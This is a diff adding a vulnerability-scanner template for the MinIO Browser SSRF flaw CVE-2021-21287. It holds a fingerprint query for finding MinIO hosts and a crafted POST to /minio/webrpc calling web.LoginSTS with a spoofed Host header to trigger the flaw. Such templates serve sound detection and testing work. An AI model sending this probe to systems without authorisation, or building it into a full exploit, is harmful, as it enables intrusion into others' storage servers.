@@ -1,0 +1,26 @@
+name: MinIO Browser API SSRF CVE-2021-21287
+manual: true
+query: product="MINIO-Browser" || company="MinIO, Inc." || app="minio-browser" ||
+  title="MinIO"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /minio/webrpc
+      headers:
+        Content-Type: application/json
+        Host: example.com
+      body: '{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"message")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-21287
+  - https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q
+  description: MinIO is a High Performance Object Storage released under Apache License
+    v2.0. It is API compatible with Amazon S3 cloud storage service. Use MinIO to
+    build high performance infrastructure for machine learning, analytics and application
+    data workloads.
+  tags: ssrf
